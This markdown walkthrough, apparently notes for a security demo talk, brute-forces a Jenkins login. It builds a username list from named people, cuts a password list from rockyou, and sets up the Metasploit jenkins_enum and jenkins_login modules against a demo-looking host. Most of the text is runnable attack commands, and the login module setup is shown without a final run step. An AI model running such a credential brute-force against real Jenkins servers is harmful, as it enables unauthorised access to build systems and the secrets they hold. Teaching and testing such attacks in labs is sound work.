# Bruteforce Jenkins Login
This section aims to login to the company's Jenkins instance.
To do so, we'll prepare a list of usernames and check login with rockyou list.
Before login can be bruteforced, the login URL must be identified via BurpSuite.

## Open Questions
- how do I know the port
- how do I know the URL

## Prepare Usernamelist

```bash
mkdir -p /root/demotalk/jenkinsBrute/
cd /root/demotalk
git clone https://github.com/captain-noob/username-list-generator.git
cd username-list-generator
rm output.txt user.txt
nano user.txt
```

put the names into nano.
Dont take all names to not break too much bruteforce into
```
Kay Meyer
Robert Bartsch
Ricardo Pope
Jeffrey van der Linden
```

```bash
python3 userlistcreator.py
mv output.txt /root/demotalk/jenkinsBrute/userlist.txt
cd /root/demotalk/jenkinsBrute/
```



## Prepare Passwordlist
Let's use the end of rockyoulist as that contains the sophisticated passwords

```bash
cd /root/demotalk/jenkinsBrute/
tail -n15 /usr/share/wordlists/rockyou.txt > /root/demotalk/jenkinsBrute/passwordlist.txt
sed -i 's/[\t ]//g;/^$/d' passwordlist.txt
```
## Enum Module
Let's get some details of Jenkins

```bash
msfconsole
use auxiliary/scanner/http/jenkins_enum
set RHOSTS jenkins.test.nevervictimconsult.xyz
set RPORT 8080
set TARGETURI /
exploit
```

## Login Scan Module


#### Get Login URL
use Burpsuite

### Prepare Options
prepare the exploit

```bash
msfconsole
use auxiliary/scanner/http/jenkins_login
set RHOSTS jenkins.test.nevervictimconsult.xyz
set RPORT 8080
set USER_FILE /root/demotalk/jenkinsBrute/userlist.txt
set PASS_FILE /root/demotalk/jenkinsBrute/passwordlist.txt
set LOGIN_URL j_spring_security_check
```

